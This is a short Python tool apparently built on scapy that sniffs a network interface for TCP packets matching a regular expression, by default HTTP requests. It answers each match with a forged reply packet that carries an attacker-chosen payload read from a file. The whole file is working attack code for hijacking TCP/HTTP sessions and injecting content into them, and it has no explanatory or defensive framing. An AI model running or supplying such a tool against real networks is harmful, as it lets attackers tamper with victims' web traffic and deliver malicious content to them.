#!/usr/bin/env python
import argparse
import re
from scapy.all import *
import signal
import sys

global total_injected_packets


def safe_close(signal, frame):
        print('User requested to close..')
        print('Total Injected Packets: %d' %(total_injected_packets))
        sys.exit(0)

signal.signal(signal.SIGINT, safe_close)


"""
The main functionality of the program.
"""
def inject_main(interface, regexp, datafile, exp):
	response_file = open(args.datafile,'r')
	response = response_file.read()
	response_file.close()
 
	regex_engine = re.compile(regexp)

	sniff(
		iface=interface,
		filter=exp,
		prn=lambda packet: _process_packet(packet, regex_engine, response)
		)

def _process_packet(packet, regex_engine, response):
	if(_is_target_packet(packet, regex_engine, response)):
		_inject_reply(packet, response)

def _is_target_packet(packet, regex_engine, response):
	try:
		return re.search(regex_engine, packet[TCP][Raw].load) != None and packet[TCP][Raw].load != response
	except:
		return False

def _inject_reply(packet, response_payload):
	global total_injected_packets
	print("Detected a request from: %s" % (packet[IP].src))
	loaded_response =  Ether(
		src		=	packet[Ether].dst,
		dst 	=	packet[Ether].src
		) / IP(
		src 	=	packet[IP].dst,
		dst 	=	packet[IP].src,
		id 		=	packet[IP].id + 42
		) / TCP(
		sport	=	packet[TCP].dport,
		dport	=	packet[TCP].sport,
		ack 	= 	packet[TCP].seq + len(packet[TCP][Raw].load),
		seq 	= 	packet[TCP].ack,
		flags	=	"PA"
		) / Raw(load = response_payload)
	print("Sending a spoofed reply to: %s" % (loaded_response[IP].dst))
	sendp(loaded_response)
	total_injected_packets += 1


if __name__ == "__main__":
	global total_injected_packets
	parser = argparse.ArgumentParser()
	parser.add_argument("-i", "--interface", default="eth0",
		help="Target Network interface to intercept traffic")
	parser.add_argument("-r", "--regexp", default="HTTP",
		help="A regular expression to filter out packets")
	parser.add_argument("-d", "--datafile", default="data/examples/payload.data",
		help="The fake payload to be injected as response")
	parser.add_argument("-e", "--expression", default="tcp", 
		help="A berkeley packet filter describing the packets to be captured")

	args = parser.parse_args()
	total_injected_packets = 0
	inject_main(args.interface, args.regexp, args.datafile, args.expression)
